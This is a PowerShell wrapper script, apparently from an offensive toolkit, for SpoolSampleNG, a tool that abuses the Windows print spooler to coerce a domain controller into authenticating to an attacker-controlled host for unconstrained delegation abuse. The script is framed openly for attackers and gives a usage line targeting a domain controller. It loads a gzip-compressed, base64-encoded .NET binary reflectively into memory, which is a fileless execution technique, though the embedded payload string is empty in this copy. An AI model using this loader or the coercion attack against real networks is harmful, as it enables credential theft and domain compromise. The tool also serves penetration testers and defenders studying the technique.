function Invoke-SpoolSample {
#.SYNOPSIS
# Wrapper for Unconstrained Delegation Exploitation via SpoolSampleNG (.NET v3.5)
# ARBITRARY VERSION NUMBER:  1.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# SpoolSampleNG is a C# implementation of SpoolSample modified for .NET reflection, allowing attackers
# to force computers with the spooler (MS-RPRN) running to authenticate to attacker owned systems 
# (specifically useful in cases where an attacker has elevated privileges on a system with Unconstrained
# Delegation privileges).
#
# This wrapper contains the entire binary with the byte stream being Gzip compressed base64 encoded.
#
# Parameters:
#   -Command  -->  Targets to force authentication through (\\source \\destination).
#   -Help     -->  Return Get-Help information
#
# Usage:
#   Unconstrained Delegation : Invoke-SpoolSample -Command "\\dc.domain \\pwned.domain"
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory
# https://github.com/tylerdotrar/SpoolSampleNG


    Param (
        [string]$Command,
        [switch]$Help
    )


    if ($Help)     { return (Get-Help Invoke-SpoolSample) }
    if (!$Command) { return '[-] Must input targets.' }


    # Gzip Compression and Base64 Encoding
    <#

    $BinaryPath = '<absolute_path_to_binary>'
    $FileStream = [IO.MemoryStream]::new([IO.File]::ReadAllBytes($BinaryPath))
    $CompressedStream = [IO.MemoryStream]::new()
    $Gzip = [IO.Compression.GzipStream]::new($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $FileStream.CopyTo($Gzip)
    $Gzip.Close()
    $Base64 = [Convert]::ToBase64String($CompressedStream.ToArray())

    #>


    # SpoolSampleNG.exe (.NET v3.5) Base64 Encoded Gzip Byte-Stream
    $Bytes = [IO.MemoryStream]::new([Convert]::FromBase64String(''))

    $Gzip = [IO.Compression.GzipStream]::new($Bytes, [IO.Compression.CompressionMode]::Decompress)
    $DecompressedStream = [IO.MemoryStream]::new()
    $Gzip.CopyTo($DecompressedStream)
    $Gzip.Close()

    $RAS = [System.Reflection.Assembly]::Load($DecompressedStream.ToArray())
    $OldConsoleOut = [Console]::Out
    $StringWriter = [IO.StringWriter]::new()
    [Console]::SetOut($StringWriter)

    # Binary Namespace
    [SpoolSampleNG.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $StringWriter.ToString()
}